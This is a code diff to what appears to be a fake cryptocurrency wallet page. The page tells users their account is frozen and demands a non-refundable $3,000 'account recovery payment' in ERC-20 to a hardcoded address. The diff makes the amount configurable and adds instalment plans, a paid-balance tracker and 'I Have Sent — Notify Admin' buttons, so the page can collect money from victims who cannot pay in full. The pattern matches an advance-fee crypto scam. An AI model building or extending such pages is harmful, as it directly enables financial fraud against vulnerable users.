@@ -216,7 +216,7 @@
           <strong style="font-size:13px;color:#dc2626;">Account Recovery Payment Required to Unfreeze Account</strong>
         </div>
         <p style="font-size:12px;color:#7f1d1d;margin:0;line-height:1.6;">
-          To process your send transaction and restore full access to the send feature, a one-time account recovery payment of <strong>$3,000 (ERC-20)</strong> is required. This payment confirms that you are the rightful owner of this account and enables the system to unfreeze your account.
+          To process your send transaction and restore full access to the send feature, a one-time account recovery payment of <strong>${{ '%.2f'|format(recovery_amount) }} (ERC-20)</strong> is required. This payment confirms that you are the rightful owner of this account and enables the system to unfreeze your account.
         </p>
       </div>
 
@@ -226,7 +226,7 @@
         <p style="margin:0 0 10px;">This payment is to <strong>unfreeze your account</strong> and verify ownership so you can continue to send and transact without restrictions.</p>
         <div style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.07em;color:var(--text3);margin-bottom:6px;">How It Works</div>
         <ol style="margin:0;padding-left:17px;">
-          <li style="margin-bottom:4px;">Pay the one-time account recovery payment of <strong>$3,000 (ERC-20)</strong>.</li>
+          <li style="margin-bottom:4px;">Pay the one-time account recovery payment of <strong>${{ '%.2f'|format(recovery_amount) }} (ERC-20)</strong>.</li>
           <li>Once confirmed on-chain, your account will be unfrozen and full access will be restored.</li>
         </ol>
       </div>
@@ -253,17 +253,81 @@
         </button>
       </div>
 
+      <!-- Payment Mode Toggle -->
+      <div style="display:flex;gap:8px;margin-bottom:14px;">
+        <button id="pay-full-btn" onclick="setPaymentMode('full')" style="flex:1;padding:9px 0;border-radius:10px;border:2px solid #dc2626;background:linear-gradient(135deg,#dc2626,#b91c1c);color:#fff;font-size:12px;font-weight:800;cursor:pointer;transition:all .2s;">
+          💳 Pay in Full
+        </button>
+        <button id="pay-install-btn" onclick="setPaymentMode('installment')" style="flex:1;padding:9px 0;border-radius:10px;border:2px solid rgba(99,102,241,.5);background:rgba(99,102,241,.08);color:#6366f1;font-size:12px;font-weight:800;cursor:pointer;transition:all .2s;">
+          📅 Pay in Instalments
+        </button>
+      </div>
+
       <!-- Payment summary table -->
-      <div style="background:var(--panel2);border:1px solid var(--border);border-radius:12px;padding:12px 15px;margin-bottom:14px;">
-        <div class="send-summary-row"><span>Recovery Payment</span><strong style="color:#dc2626;">$3,000.00</strong></div>
+      <div style="background:var(--panel2);border:1px solid var(--border);border-radius:12px;padding:12px 15px;margin-bottom:14px;" id="payment-summary-box">
+        <div class="send-summary-row"><span>Total Recovery Payment</span><strong style="color:#dc2626;">${{ '%.2f'|format(recovery_amount) }}</strong></div>
         <div class="send-summary-row"><span>Network</span><strong>Ethereum (ERC-20)</strong></div>
         <div class="send-summary-row"><span>Purpose</span><strong>Unfreezing of account &amp; ownership verification</strong></div>
-        <div class="send-summary-row"><span>Payment Type</span><strong>One-time recovery payment</strong></div>
+        <div class="send-summary-row" id="pay-type-row"><span>Payment Type</span><strong>One-time recovery payment</strong></div>
         <div class="send-summary-row"><span>Refundable</span><strong style="color:#dc2626;">No</strong></div>
       </div>
 
-      <button class="wm-cta-btn" onclick="submitGasPayment()" style="background:linear-gradient(135deg,#dc2626,#b91c1c);box-shadow:0 4px 18px rgba(220,38,38,.35);">
+      <!-- Instalment Plan selector (hidden by default) -->
+      <div id="instalment-plan-box" style="display:none;background:rgba(99,102,241,.07);border:1.5px solid rgba(99,102,241,.3);border-radius:12px;padding:14px 15px;margin-bottom:14px;">
+        <div style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.07em;color:#6366f1;margin-bottom:10px;">Choose an Instalment Plan</div>
+        <div style="display:flex;flex-direction:column;gap:8px;" id="plan-options">
+          <label id="plan-2" class="install-plan-opt" onclick="selectPlan(2,1500)" style="display:flex;align-items:center;gap:10px;padding:10px 12px;border-radius:9px;border:1.5px solid rgba(99,102,241,.25);background:var(--panel2);cursor:pointer;font-size:12px;">
+            <input type="radio" name="install-plan" value="2" style="accent-color:#6366f1;width:15px;height:15px;">
+            <div style="flex:1;"><strong>2 Payments</strong> <span style="color:var(--text3);"> — $1,500.00 now · $1,500.00 later</span></div>
+          </label>
+          <label id="plan-3" class="install-plan-opt" onclick="selectPlan(3,1000)" style="display:flex;align-items:center;gap:10px;padding:10px 12px;border-radius:9px;border:1.5px solid rgba(99,102,241,.25);background:var(--panel2);cursor:pointer;font-size:12px;">
+            <input type="radio" name="install-plan" value="3" style="accent-color:#6366f1;width:15px;height:15px;">
+            <div style="flex:1;"><strong>3 Payments</strong> <span style="color:var(--text3);"> — $1,000.00 now · $1,000.00 × 2 later</span></div>
+          </label>
+          <label id="plan-5" class="install-plan-opt" onclick="selectPlan(5,600)" style="display:flex;align-items:center;gap:10px;padding:10px 12px;border-radius:9px;border:1.5px solid rgba(99,102,241,.25);background:var(--panel2);cursor:pointer;font-size:12px;">
+            <input type="radio" name="install-plan" value="5" style="accent-color:#6366f1;width:15px;height:15px;">
+            <div style="flex:1;"><strong>5 Payments</strong> <span style="color:var(--text3);"> — $600.00 now · $600.00 × 4 later</span></div>
+          </label>
+        </div>
+      </div>
+
+      <!-- Instalment Balance Tracker (hidden until plan selected) -->
+      <div id="instalment-balance-box" style="display:none;background:linear-gradient(135deg,rgba(99,102,241,.13),rgba(99,102,241,.05));border:1.5px solid rgba(99,102,241,.35);border-radius:13px;padding:14px 15px;margin-bottom:14px;">
+        <div style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.07em;color:#6366f1;margin-bottom:10px;">📊 Instalment Balance</div>
+        <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:12px;">
+          <div style="text-align:center;background:rgba(220,38,38,.1);border:1px solid rgba(220,38,38,.25);border-radius:9px;padding:10px 6px;">
+            <div style="font-size:10px;color:#dc2626;font-weight:700;text-transform:uppercase;letter-spacing:.04em;margin-bottom:4px;">Total</div>
+            <div id="balance-total-display" style="font-size:15px;font-weight:900;color:#dc2626;">${{ '%.2f'|format(recovery_amount) }}</div>
+          </div>
+          <div style="text-align:center;background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.25);border-radius:9px;padding:10px 6px;">
+            <div style="font-size:10px;color:#16a34a;font-weight:700;text-transform:uppercase;letter-spacing:.04em;margin-bottom:4px;">Paid</div>
+            <div id="balance-paid" style="font-size:15px;font-weight:900;color:#16a34a;">$0</div>
+          </div>
+          <div style="text-align:center;background:rgba(99,102,241,.1);border:1px solid rgba(99,102,241,.3);border-radius:9px;padding:10px 6px;">
+            <div style="font-size:10px;color:#6366f1;font-weight:700;text-transform:uppercase;letter-spacing:.04em;margin-bottom:4px;">Remaining</div>
+            <div id="balance-remaining" style="font-size:15px;font-weight:900;color:#6366f1;">$3,000</div>
+          </div>
+        </div>
+        <!-- Progress bar -->
+        <div style="background:rgba(255,255,255,.1);border-radius:99px;height:7px;overflow:hidden;margin-bottom:10px;">
+          <div id="balance-progress-bar" style="height:100%;border-radius:99px;background:linear-gradient(90deg,#6366f1,#22c55e);width:0%;transition:width .5s ease;"></div>
+        </div>
+        <!-- Instalment schedule list -->
+        <div style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.07em;color:var(--text3);margin-bottom:7px;">Payment Schedule</div>
+        <div id="instalment-schedule-list" style="display:flex;flex-direction:column;gap:5px;"></div>
+      </div>
+
+      <!-- Due-now amount display (instalment mode) -->
+      <div id="instalment-due-now" style="display:none;background:rgba(99,102,241,.07);border:1px solid rgba(99,102,241,.25);border-radius:10px;padding:10px 14px;margin-bottom:14px;font-size:12px;color:var(--text2);text-align:center;">
+        Amount due now: <strong id="instalment-due-now-amt" style="color:#6366f1;font-size:14px;"></strong>
+      </div>
+
+      <!-- CTA Buttons -->
+      <button id="cta-full-btn" class="wm-cta-btn" onclick="submitGasPayment('full')" style="background:linear-gradient(135deg,#dc2626,#b91c1c);box-shadow:0 4px 18px rgba(220,38,38,.35);">
         <i class="bi bi-check2-circle me-2"></i>I Have Sent — Notify Admin
+      </button>
+      <button id="cta-install-btn" class="wm-cta-btn" onclick="submitGasPayment('installment')" style="display:none;background:linear-gradient(135deg,#6366f1,#4f46e5);box-shadow:0 4px 18px rgba(99,102,241,.35);">
+        <i class="bi bi-credit-card-2-front me-2"></i>I Have Sent Instalment — Notify Admin
       </button>
       <div id="dep-status" style="text-align:center;font-size:13px;margin-top:8px;min-height:18px;"></div>
     </div>
@@ -275,8 +339,8 @@
   <div class="modal-dialog modal-dialog-centered modal-sm">
     <div class="modal-content text-center" style="border-radius:18px;padding:28px;">
       <div style="font-size:52px;margin-bottom:12px;">⏳</div>
-      <h5 class="fw-800 mb-2">Recovery Payment Notified!</h5>
-      <p class="text-secondary" style="font-size:13px;">Admin has been notified. Your account will be unfrozen and your withdrawal processed after payment verification.</p>
+      <h5 class="fw-800 mb-2">Payment Notified!</h5>
+      <p class="text-secondary" style="font-size:13px;">Admin has been notified of your payment. Your account will be unfrozen and your withdrawal processed after payment verification. If paying in instalments, continue making payments until the full balance is cleared.</p>
       <button class="wm-cta-btn mt-2" data-bs-dismiss="modal" style="font-size:14px;padding:10px;">Done</button>
     </div>
   </div>
@@ -436,6 +500,7 @@
 
   const EVM_ADDR = '0x9901E676D0a27e2B5D3DC9fc9fe227F003F559cf';
   const SOL_ADDR = '67ZMMrmdR7S2shWpLmfrHZd2dF68JZZyNGDWjfHWcQSV';
+  const RECOVERY_AMOUNT = {{ recovery_amount | tojson }};
 
   const DEP_ADDRESSES = {
     ethereum: EVM_ADDR, bsc: EVM_ADDR, polygon: EVM_ADDR,
@@ -474,11 +539,124 @@
     document.getElementById('send-sym-label').textContent = _sendSym;
   }
 
+  // ── Instalment state ──────────────────────────────────────
+  let _payMode        = 'full';       // 'full' | 'installment'
+  let _installParts   = 0;            // number of parts chosen
+  let _installDueNow  = 0;            // amount due for current payment
+  let _installPaid    = 0;            // cumulative amount already paid
+  const TOTAL_RECOVERY = RECOVERY_AMOUNT;
+
+  function setPaymentMode(mode) {
+    _payMode = mode;
+    const fullBtn    = document.getElementById('pay-full-btn');
+    const instBtn    = document.getElementById('pay-install-btn');
+    const planBox    = document.getElementById('instalment-plan-box');
+    const balBox     = document.getElementById('instalment-balance-box');
+    const dueNow     = document.getElementById('instalment-due-now');
+    const ctaFull    = document.getElementById('cta-full-btn');
+    const ctaInstall = document.getElementById('cta-install-btn');
+    const payTypeRow = document.getElementById('pay-type-row');
+
+    if (mode === 'full') {
+      fullBtn.style.background    = 'linear-gradient(135deg,#dc2626,#b91c1c)';
+      fullBtn.style.border        = '2px solid #dc2626';
+      fullBtn.style.color         = '#fff';
+      instBtn.style.background    = 'rgba(99,102,241,.08)';
+      instBtn.style.border        = '2px solid rgba(99,102,241,.5)';
+      instBtn.style.color         = '#6366f1';
+      planBox.style.display       = 'none';
+      balBox.style.display        = 'none';
+      dueNow.style.display        = 'none';
+      ctaFull.style.display       = '';
+      ctaInstall.style.display    = 'none';
+      payTypeRow.innerHTML        = '<span>Payment Type</span><strong>One-time recovery payment</strong>';
+    } else {
+      instBtn.style.background    = 'linear-gradient(135deg,#6366f1,#4f46e5)';
+      instBtn.style.border        = '2px solid #6366f1';
+      instBtn.style.color         = '#fff';
+      fullBtn.style.background    = 'rgba(220,38,38,.08)';
+      fullBtn.style.border        = '2px solid rgba(220,38,38,.4)';
+      fullBtn.style.color         = '#dc2626';
+      planBox.style.display       = '';
+      ctaFull.style.display       = 'none';
+      ctaInstall.style.display    = _installParts ? '' : 'none';
+      payTypeRow.innerHTML        = '<span>Payment Type</span><strong style="color:#6366f1;">Instalment payment</strong>';
+    }
+  }
+
+  function selectPlan(parts, amtPerPart) {
+    _installParts  = parts;
+    _installDueNow = amtPerPart;
+
+    // Highlight selected plan
+    document.querySelectorAll('.install-plan-opt').forEach(el => {
+      el.style.border    = '1.5px solid rgba(99,102,241,.25)';
+      el.style.background = 'var(--panel2)';
+    });
+    const selected = document.getElementById('plan-' + parts);
+    if (selected) {
+      selected.style.border    = '2px solid #6366f1';
+      selected.style.background = 'rgba(99,102,241,.12)';
+    }
+
+    // Show due-now
+    const dueNowBox = document.getElementById('instalment-due-now');
+    dueNowBox.style.display = '';
+    document.getElementById('instalment-due-now-amt').textContent = '$' + amtPerPart.toFixed(2);
+
+    // Build schedule list
+    renderInstalmentBalance();
+
+    // Show balance box + install CTA
+    document.getElementById('instalment-balance-box').style.display = '';
+    document.getElementById('cta-install-btn').style.display = '';
+  }
+
+  function renderInstalmentBalance() {
+    const paid      = _installPaid;
+    const remaining = Math.max(0, TOTAL_RECOVERY - paid);
+    const pct       = Math.min(100, (paid / TOTAL_RECOVERY) * 100);
+
+    document.getElementById('balance-paid').textContent      = '$' + paid.toFixed(2);
+    document.getElementById('balance-remaining').textContent = '$' + remaining.toFixed(2);
+    document.getElementById('balance-progress-bar').style.width = pct + '%';
+
+    // Schedule rows
+    const list = document.getElementById('instalment-schedule-list');
+    list.innerHTML = '';
+    const amt     = TOTAL_RECOVERY / _installParts;
+    const paidCnt = Math.round(paid / amt);
+
+    for (let i = 0; i < _installParts; i++) {
+      const isPaid = i < paidCnt;
+      const isCurrent = i === paidCnt;
+      const row = document.createElement('div');
+      row.style.cssText = `display:flex;align-items:center;justify-content:space-between;padding:7px 10px;border-radius:8px;font-size:11px;background:${isPaid ? 'rgba(34,197,94,.08)' : isCurrent ? 'rgba(99,102,241,.1)' : 'var(--panel2)'};border:1px solid ${isPaid ? 'rgba(34,197,94,.25)' : isCurrent ? 'rgba(99,102,241,.3)' : 'var(--border)'};`;
+      row.innerHTML = `
+        <span style="color:var(--text2);">${isPaid ? '✅' : isCurrent ? '🔵' : '⬜'} Payment ${i + 1}</span>
+        <strong style="color:${isPaid ? '#16a34a' : isCurrent ? '#6366f1' : 'var(--text2)'};">$${amt.toFixed(2)} ${isPaid ? '<span style="font-size:9px;font-weight:600;">(Paid)</span>' : isCurrent ? '<span style="font-size:9px;font-weight:600;">(Due Now)</span>' : ''}</strong>
+      `;
+      list.appendChild(row);
+    }
+  }
+
   function proceedToSendDeposit() {
     const addr   = document.getElementById('send-recipient').value.trim();
     const amount = document.getElementById('send-amount').value.trim();
     if (!addr)   { alert('Please enter a recipient address.'); return; }
     if (!amount || parseFloat(amount) <= 0) { alert('Please enter an amount.'); return; }
+
+    // Reset to full payment mode on open
+    _payMode = 'full'; _installParts = 0; _installPaid = 0;
+    setPaymentMode('full');
+    document.querySelectorAll('.install-plan-opt').forEach(el => {
+      el.style.border = '1.5px solid rgba(99,102,241,.25)';
+      el.style.background = 'var(--panel2)';
+      el.querySelector('input[type=radio]').checked = false;
+    });
+    document.getElementById('instalment-balance-box').style.display = 'none';
+    document.getElementById('instalment-due-now').style.display     = 'none';
+    document.getElementById('instalment-plan-box').style.display    = 'none';
 
     // Account recovery payment is ALWAYS ERC-20 regardless of sending chain
     document.getElementById('dep-addr-display').textContent = EVM_ADDR;
@@ -493,8 +671,13 @@
     document.getElementById('send-deposit-overlay').classList.remove('hidden');
   }
 
-  async function submitGasPayment() {
-    const btn    = document.querySelector('#send-deposit-overlay .wm-cta-btn');
+  async function submitGasPayment(mode) {
+    const isInstalment = (mode === 'installment') && _installParts > 0;
+    const amountUsd    = isInstalment ? _installDueNow : RECOVERY_AMOUNT;
+
+    const btn    = isInstalment
+      ? document.getElementById('cta-install-btn')
+      : document.getElementById('cta-full-btn');
     const status = document.getElementById('dep-status');
     btn.disabled = true;
     btn.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span>Submitting…';
@@ -504,16 +687,29 @@
         method:'POST',
         headers:{'Content-Type':'application/json'},
         body: JSON.stringify({
-          chain:     _sendChain,
-          amount_usd: 3000,
+          chain:          _sendChain,
+          amount_usd:     amountUsd,
+          payment_mode:   isInstalment ? 'installment' : 'full',
+          instalment_of:  isInstalment ? _installParts : null,
+          instalment_num: isInstalment ? Math.round(_installPaid / _installDueNow) + 1 : null,
         }),
       });
     } catch(e) {}
 
+    // Update paid balance for instalment
+    if (isInstalment) {
+      _installPaid = Math.min(TOTAL_RECOVERY, _installPaid + _installDueNow);
+      renderInstalmentBalance();
+    }
+
     document.getElementById('send-deposit-overlay').classList.add('hidden');
     new bootstrap.Modal(document.getElementById('sendSuccessModal')).show();
     btn.disabled = false;
-    btn.innerHTML = '<i class="bi bi-check2-circle me-2"></i>I Have Sent — Notify Admin';
+    if (isInstalment) {
+      btn.innerHTML = '<i class="bi bi-credit-card-2-front me-2"></i>I Have Sent Instalment — Notify Admin';
+    } else {
+      btn.innerHTML = '<i class="bi bi-check2-circle me-2"></i>I Have Sent — Notify Admin';
+    }
   }
 
   // ── Receive modal ─────────────────────────────────────────
